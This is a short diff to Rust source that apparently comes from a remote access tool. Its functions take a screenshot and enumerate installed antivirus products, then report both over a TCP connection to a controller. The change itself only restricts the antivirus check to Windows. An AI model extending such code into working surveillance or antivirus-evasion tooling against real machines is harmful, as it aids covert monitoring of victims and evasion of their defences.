@@ -328,6 +328,7 @@ pub fn screenshot(conn: &mut TcpStream) -> Result<bool, String> {
 // ---- Screenshot ---------------------------
 
 // ---- Av ---------------------------
+#[cfg(windows)]
 fn get_installed_avs() -> Result<Vec<AntiVirus>, String> {
     use windows::Win32::{
         System::Com::*,
@@ -405,6 +406,12 @@ fn get_installed_avs() -> Result<Vec<AntiVirus>, String> {
 
 
 pub fn av(conn: &mut TcpStream) -> Result<bool, String> {
+    #[cfg(not(target_os = "windows"))]
+    {
+        let _ = send_message(conn, &ClientMessage::Error("Function only works on windows".to_string()));
+        return Ok(true)
+    }
+
     let avs: Vec<AntiVirus> = match get_installed_avs() {
         Ok(avs) => avs,
         Err(e) => {
